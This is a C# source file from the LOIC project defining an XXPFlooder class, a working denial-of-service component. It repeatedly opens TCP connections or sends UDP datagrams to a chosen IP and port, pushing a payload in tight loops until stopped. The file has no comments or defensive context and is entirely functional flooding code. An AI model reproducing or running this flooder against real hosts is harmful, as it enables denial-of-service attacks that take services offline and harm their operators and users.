using System;
using System.Net.Sockets;
using System.ComponentModel;

namespace LOIC
{
	public class XXPFlooder
	{
		public bool IsFlooding { get; set; }

		public int FloodCount { get; set; }

		public string IP { get; set; }

		public int Port { get; set; }

		public int Protocol { get; set; }

		public int Delay { get; set; }

		public bool Resp { get; set; }

		public string Data { get; set; }

		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
		}

		public void Start()
		{
			IsFlooding = true;
			var bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}

		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					if (Protocol == 1)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(RHost);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								socket.Send(buf);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
					if (Protocol == 2)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								socket.SendTo(buf, SocketFlags.None, RHost);
								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}
	}
}
